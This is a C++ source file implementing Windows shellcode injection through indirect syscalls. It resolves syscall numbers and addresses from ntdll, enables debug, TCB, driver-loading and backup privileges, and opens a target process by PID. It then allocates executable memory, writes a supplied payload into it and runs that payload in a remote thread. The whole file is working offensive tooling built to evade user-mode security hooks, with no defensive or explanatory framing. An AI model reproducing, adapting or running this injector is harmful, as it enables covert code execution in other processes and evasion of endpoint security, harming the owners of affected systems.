#include "syscall_tools(nt).h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
VOID IndirectPrelude(
	_In_  HMODULE NtdllHandle,
	_In_  LPCSTR NtFunctionName,
	_Out_ PDWORD NtFunctionSSN,
	_Out_ PUINT_PTR NtFunctionSyscall
) {

	DWORD SyscallNumber = 0;
	UINT_PTR NtFunctionAddress = 0;
	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

	NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
	if (0 == NtFunctionAddress) {
		std::cout << "getprocaddress failed, errror" << GetLastError() << std::endl;
		
		return;
	}

	*NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
	*NtFunctionSyscall = NtFunctionAddress + 0x12;


	/* making memcmp happy */
	if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) == 0) {
		std::cout << "[ function address" << (PVOID)NtFunctionAddress << "] [ address " << (PVOID)*NtFunctionSyscall << "] [ function ssn " << *NtFunctionSSN << "] -> function name "<<NtFunctionName << std::endl;
		
		
		return;
	}

	else {
		std::cout << "expected signature did not match"<<std::endl;
		return;
	}

}
bool EnableAllRequiredPrivileges() {
	const WCHAR* requiredPrivileges[] = {
		SE_DEBUG_NAME,
		SE_LOAD_DRIVER_NAME,
		SE_SYSTEM_ENVIRONMENT_NAME,
		SE_BACKUP_NAME,
		SE_RESTORE_NAME,
		SE_TCB_NAME
	};

	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool allSucceeded = true;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
		return false;
	}

	for (const auto& privilege : requiredPrivileges) {
		if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
			std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
			continue;
		}

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
			std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
			allSucceeded = false;
			continue;
		}

		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
			std::cout << "Failed to assign all privileges" << std::endl;
			allSucceeded = false;
		}
	}

	CloseHandle(hToken);
	return allSucceeded;
}

bool syscall_injection(_In_ const char* process_id, _In_ const unsigned char* payload, _In_ SIZE_T payload_size) {
	using std::cout;
	using std::endl;

	DWORD PID = 0;
	PID = atoi(process_id);
	HANDLE hProcess, hThread = NULL;
	LPVOID rBuffer = NULL;
	HMODULE hNTDLL = NULL;
	NTSTATUS STATUS = NULL;
	OBJECT_ATTRIBUTES OA;
	InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);
	CLIENT_ID CID = { (HANDLE)(ULONG_PTR)PID,NULL };
	HANDLE token;
	TOKEN_PRIVILEGES tp;
	if (!EnableAllRequiredPrivileges()) {
		cout << "Warning: Failed to enable all required privileges" << endl;

	}
	cout << "elevataed all required privalages" << endl;

	
	


	
	hNTDLL = GetModuleHandleW(L"NTDLL.dll");
	if (hNTDLL == NULL) {
		cout << "failed to get module handle on NTDLL, error:" << GetLastError() << endl;
		return false;
	}
	
	
	cout << "populating function prototypes" << endl;
	IndirectPrelude(hNTDLL, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);
	IndirectPrelude(hNTDLL, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN, &g_NtAllocateVirtualMemorySyscall);
	IndirectPrelude(hNTDLL, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall);
	IndirectPrelude(hNTDLL, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall);
	IndirectPrelude(hNTDLL, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
	IndirectPrelude(hNTDLL, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);
	IndirectPrelude(hNTDLL, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);
	if (payload == nullptr || payload_size == 0) {
		cout << "Invalid payload" << endl;
		return false;
	}

	if (PID == 0) {
		cout << "Invalid process ID" << endl;
		return false;
	}
	
	
	cout << "finished, starting injection" << endl;
	cout << "CLIENT_ID: PID=" << CID.UniqueProcess << ", ThreadID=" << CID.UniqueThread << endl;
	cout << "OBJECT_ATTRIBUTES Length: " << OA.Length << endl;
	

	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to get handle on process, error:" << std::hex << STATUS << endl;
		NtClose(hProcess);
		return false;
	}
	cout << "got a handle on process" << endl;
	MEMORY_BASIC_INFORMATION mbi;
	if (VirtualQuery((PVOID)g_NtOpenProcessSyscall, &mbi, sizeof(mbi)) &&mbi.AllocationBase == hNTDLL) {
		cout << "Syscall address is valid and within ntdll.dll\n";
	}
	else {
		cout << "Syscall address is invalid or outside ntdll.dll\n";
		return false;
	}
	SIZE_T sc = payload_size;

	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &sc, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to alloc mem, error:" << std::hex << STATUS << endl;
		NtClose(hProcess);
		return false;
	}
	cout << "virtual mem allocated,\n rBuffer: " << rBuffer << " \nshellcode size: " << sc << endl;

	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)payload, payload_size, NULL);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to write mem, error:" << std::hex << STATUS << endl;
		cout << "size of shellcode, " << sc << endl;
		cout << " size of original shellcode " << payload_size << endl;
		NtClose(hProcess);
		return false;
	}
	cout << "wrote in process memory" << endl;
	ULONG oldProtect;
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &sc, PAGE_EXECUTE_READ, &oldProtect);
	if (STATUS != STATUS_SUCCESS) {
		cout << "Failed to set executable permissions, error: " << std::hex << STATUS << endl;
		NtClose(hProcess);
		return false;
	}
	cout << "Memory protection updated to PAGE_EXECUTE_READ" << endl;
	
	

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS) {
		cout << "failed to make thread, error " << std::hex << STATUS << endl;
		NtClose(hThread);
		NtClose(hProcess);
		return false;
	}
	cout << "got handle to thread , waiting for object to finish executing" << endl;

	NtWaitForSingleObject(hThread, FALSE, NULL);
	cout << "thread finished execution" << endl;

	NtClose(hThread);
	NtClose(hProcess);
	cout << "finished cleanup" << endl;
	return true;

}